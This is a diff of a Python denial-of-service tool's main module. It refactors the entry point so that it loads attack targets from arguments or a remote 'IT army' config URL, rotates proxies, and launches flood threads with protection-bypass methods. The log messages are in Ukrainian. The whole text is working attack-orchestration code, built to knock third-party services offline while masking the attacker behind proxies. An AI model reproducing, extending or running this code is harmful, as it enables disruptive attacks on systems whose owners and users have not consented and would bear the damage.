@@ -122,56 +122,61 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     event.clear()
 
 
-def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, proxies_file, vpn_mode, debug, table):
-    if table:
-        debug = False
+def start(args):
+    print_banner(args.vpn_mode)
+    fix_ulimits()
+
+    if args.table:
+        args.debug = False
 
     for bypass in ('CFB', 'DGB', 'BYPASS'):
-        if bypass in http_methods:
+        if bypass in args.http_methods:
             logger.warning(
                 f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                 f'за замовчуванням може бути ефективніша{cl.RESET}'
             )
 
     thread_pool = DaemonThreadPool()
-    total_threads = thread_pool.start(total_threads)  # It is possible that not all threads were started
+    total_threads = thread_pool.start(args.threads)  # It is possible that not all threads were started
+    if args.itarmy:
+        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
+    else:
+        targets_iter = Targets(args.targets, args.config)
+
     while True:
         targets = list(get_resolvable_targets(targets_iter, thread_pool))
         if not targets:
             logger.error(f'{cl.RED}Не знайдено жодної доступної цілі{cl.RESET}')
             exit()
 
-        if rpc < LOW_RPC:
+        if args.rpc < LOW_RPC:
             logger.warning(
                 f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                 f'через збільшення кількості перепідключень{cl.RESET}'
             )
 
-        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
+        no_proxies = args.vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         proxies = []
         if not no_proxies:
-            proxies = update_proxies(thread_pool, period, targets, proxy_timeout, proxies_file)
-        run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
+            proxies = update_proxies(thread_pool, args.period, targets, args.proxy_timeout, args.proxies)
+
+        run_ddos(
+            thread_pool,
+            proxies,
+            targets,
+            total_threads,
+            args.period,
+            args.rpc,
+            args.http_methods,
+            args.vpn_mode,
+            args.proxy_timeout,
+            args.debug,
+            args.table
+        )
 
 
 if __name__ == '__main__':
-    args = init_argparse().parse_args()
-    print_banner(args.vpn_mode)
-    fix_ulimits()
-    if args.itarmy:
-        targets = Targets([], IT_ARMY_CONFIG_URL)
-    else:
-        targets = Targets(args.targets, args.config)
-
-    start(
-        args.threads,
-        args.period,
-        targets,
-        args.rpc,
-        args.proxy_timeout,
-        args.http_methods,
-        args.proxies,
-        args.vpn_mode,
-        args.debug,
-        args.table,
-    )
+    try:
+        start(init_argparse().parse_args())
+    except KeyboardInterrupt:
+        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
